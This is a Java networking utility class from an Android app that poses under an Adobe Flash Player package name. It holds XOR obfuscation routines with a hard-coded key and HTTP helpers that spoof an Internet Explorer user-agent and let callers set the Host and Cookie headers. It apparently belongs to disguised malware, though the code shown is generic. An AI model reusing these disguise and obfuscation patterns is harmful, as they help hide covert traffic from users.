package com.adobe.flashplayer.network;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.util.UUID;

import android.content.Context;
import android.provider.Settings;
import android.util.Log;

import com.adobe.flashplayer.PrefOper;
import com.adobe.flashplayer.Public;

import javax.net.ssl.HttpsURLConnection;


public class NetworkUtils {
	
	public static final int WIFI_CONNECTION 			= 8;
	public static final int WIRELESS_CONNECTION 		= 4;
	public static final int NONE_CONNECTION 			= 0;

    public static String gKey = "fuck all android crackers";


	
	public static int getNetworkType(Context context) {
        ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        if (networkInfo != null && networkInfo.isConnected()) {
            int type = networkInfo.getType();
            if (type == ConnectivityManager.TYPE_WIFI) {
                return WIFI_CONNECTION;
            } else if (type == ConnectivityManager.TYPE_MOBILE) {
                return WIRELESS_CONNECTION;
            }
            else{
            	return NONE_CONNECTION;
            }
        }
        else{
        	return NONE_CONNECTION;
        }
    }
    
    
    public static boolean isNetworkAvailable(Context context) {
        ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);  
        NetworkInfo networkInfo = cm.getActiveNetworkInfo();  
        if (networkInfo != null && networkInfo.isConnected()) {  
            return true;  
        }  
         
        return false;  
    }








    public static void encrypt(byte[] src,byte[]dst,byte[] key,int srcpos,int dstpos,int len){

        int keylen = key.length;

        for (int i = 0,j = 0; i < len; i++) {

            dst[i+dstpos] = (byte)(src[i+srcpos] ^ key[j]);
            j ++;
            if(j >= keylen ){
                j = 0;
            }
        }

        return ;
    }

    public static byte[] xorCryptData(byte[]data,byte[]key,byte dst[]){

        if(key.length <= 0 || data.length <= 0){
            return data;
        }

        for(int i = 0,j = 0; i < data.length; i ++){
            dst [i] = (byte)(data[i] ^ key[j]);
            j ++;
            if(j >= key.length){
                j = 0 ;
            }
        }

        return data;
    }



    public static String sendHttpPost(Context context,String url, String param) {
        if(isNetworkAvailable (context) == false){
            return "";
        }

        PrintWriter out = null;
        BufferedReader in = null;
        String result = "";
        try {
            URL realUrl = new URL(url);
            URLConnection conn = realUrl.openConnection();
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");

            conn.setDoOutput(true);
            conn.setDoInput(true);
            out = new PrintWriter(conn.getOutputStream());
            out.print(param);
            out.flush();

            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result += line;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        finally{
            try{
                if(out!=null){
                    out.close();
                }
                if(in!=null){
                    in.close();
                }
            }
            catch(IOException ex){
                ex.printStackTrace();
            }
        }
        return result;
    }


    public static String sendHttpGet(Context context, String method,String url,String host,String cookie) {
        String result = "";
        if(isNetworkAvailable (context) == false){
            return "";
        }

        BufferedReader in = null;

        try {
            String urlName = url;
            URL realUrl = new URL(urlName);

            HttpURLConnection connection = (HttpURLConnection)realUrl.openConnection();

            connection.setRequestProperty("Accept", "*/*");
            connection.setRequestProperty("Connection", "Keep-Alive");
            connection.setRequestProperty("User-Agent","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
            if(host != null && host.equals("") == false){
                connection.setRequestProperty("Host", host);
            }
            if(cookie != null && cookie.equals("") == false){
                connection.setRequestProperty("Cookie", cookie);
            }

            connection.setRequestMethod(method);
            connection.connect();

            in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line = "";
            while ((line = in.readLine()) != null) {
                result += line;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        finally {
            try {
                if (in != null) {
                    in.close();
                }
            } catch (Exception ex) {

                ex.printStackTrace();
            }
        }
        return result;
    }


}
